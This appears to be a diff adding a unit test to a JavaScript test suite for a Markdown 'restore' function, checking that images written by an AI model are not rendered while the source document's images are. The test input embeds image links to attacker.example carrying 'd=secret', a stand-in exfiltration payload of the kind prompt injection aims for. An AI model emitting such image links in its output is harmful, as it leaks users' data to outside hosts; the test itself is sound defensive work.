@@ -53,6 +53,21 @@ describe("restore", () => {
     expect(container.querySelector("blockquote + p")?.textContent).toBe("後の段落");
   });
 
+  it("never loads an image the model wrote itself, but still shows the source's images", () => {
+    const container = document.createElement("div");
+    container.innerHTML = renderMarkdown(
+      restore(
+        "こんにちは ![秘密](https://attacker.example/p?d=secret) と ![参照][r] と ![略]\n\n図 ⟦K2⟧\n\n[r]: https://attacker.example/r\n[略]: https://attacker.example/s",
+        doc,
+      ),
+    );
+    expect(Array.from(container.querySelectorAll("img"), (img) => img.getAttribute("src"))).toEqual([
+      "https://example.com/a%20(1).png",
+    ]);
+    expect(container.textContent).toContain("秘密");
+    expect(container.innerHTML).not.toContain("d=secret");
+  });
+
   it("drops tokens the document does not have", () => {
     expect(restore("あ⟦K9⟧い", doc)).toBe("あい");
   });
